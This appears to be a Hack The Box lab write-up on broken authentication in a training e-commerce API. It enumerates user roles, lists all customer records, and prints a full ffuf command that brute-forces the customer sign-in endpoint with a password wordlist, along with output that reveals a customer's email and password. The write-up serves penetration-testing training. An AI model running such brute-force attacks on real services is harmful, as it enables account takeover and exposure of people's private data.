# Broken Authentication

Vulnerable endpoint: CWE-307: Improper Restriction of Excessive Authentication Attempts https://cwe.mitre.org/data/definitions/307.html

Credentials supplied are : `htbpentester3@hackthebox.com:HTBPentester3`, wanting us to assess what API vulnerabilities can the user exploit with their assigned roles.

<img width="1777" height="605" alt="image" src="https://github.com/user-attachments/assets/b451bf39-8bd2-4fde-a1aa-36b50ca47240" />
<img width="1781" height="273" alt="image" src="https://github.com/user-attachments/assets/524975bb-99b7-4eeb-ba0d-07484cd4088a" />
<img width="1339" height="405" alt="image" src="https://github.com/user-attachments/assets/a6b1a2b7-5327-4c1a-a4c6-8154f6779f31" />

Customers -> 

<img width="1017" height="83" alt="image" src="https://github.com/user-attachments/assets/7ba7beaf-a99c-4b96-b3f7-f169b83dee3d" />

Execute -> 

<img width="1748" height="284" alt="image" src="https://github.com/user-attachments/assets/4fce048a-cb4c-41af-8704-998cae4a63fd" />


Roles -> 

The /api/v1/roles/current-user endpoint reveals that the user is assigned three roles: Customers_UpdateByCurrentUser, Customers_Get, and Customers_GetAll:

<img width="1768" height="255" alt="image" src="https://github.com/user-attachments/assets/63fe822a-f104-42e5-81ca-47bea053d482" />

Customers_GetAll allows us to use the /api/v1/customers endpoint, which returns the records of all customers:

<img width="1830" height="509" alt="image" src="https://github.com/user-attachments/assets/d3fa97f8-d351-4164-9741-16a77348b3f3" />
<img width="1768" height="582" alt="image" src="https://github.com/user-attachments/assets/e5947d73-d09d-4d92-b3fd-5bb910ef4e2e" />

<img width="1754" height="593" alt="image" src="https://github.com/user-attachments/assets/0dbfdf54-ef56-4778-b4b6-912348d5cec2" />
<img width="1294" height="606" alt="image" src="https://github.com/user-attachments/assets/00c8eac8-5ddb-4ae3-924a-e4e035b30531" />
<img width="1070" height="591" alt="image" src="https://github.com/user-attachments/assets/61b9a4d7-75dc-4c05-bd92-6f8fb45d7388" />
<img width="1489" height="705" alt="image" src="https://github.com/user-attachments/assets/f5a60159-6c8e-422c-9f21-4d3ee5b2ce42" />
<img width="1768" height="548" alt="image" src="https://github.com/user-attachments/assets/fcf24ccb-1d1c-46ab-aafe-9f5f40cac7cd" />
<img width="1764" height="429" alt="image" src="https://github.com/user-attachments/assets/60a2becf-4a2a-4dbf-99e4-35b7ee315350" />
<img width="1010" height="456" alt="image" src="https://github.com/user-attachments/assets/ff689483-f0f5-472d-8b01-b5e2f219fb8c" />


API uses a weak password policy lets use ffuf

<img width="1467" height="668" alt="image" src="https://github.com/user-attachments/assets/3155568c-ffda-4266-ae06-0deaf6ed98c4" />

```
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.59.63:31874/api/v1/authentication/customers/sign-in
 :: Wordlist         : PASS: /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 :: Wordlist         : EMAIL: /home/htb-ac-413848/customerEmails.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"Email": "EMAIL", "Password": "PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid Credentials
________________________________________________

[Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
    * EMAIL: IsabellaRichardson@gmail.com
    * PASS: qwerasdfzxcv

:: Progress: [30000/30000] :: Job [1/1] :: 1275 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

We can use the `/api/v1/authentication/customers/sign-in` endpoint with the credentials `IsabellaRichardson@gmail.com:qwerasdfzxcv` to obtain a JWT as Isabella and view all her confidential information on Inlanefreight E-Commerce Marketplace.





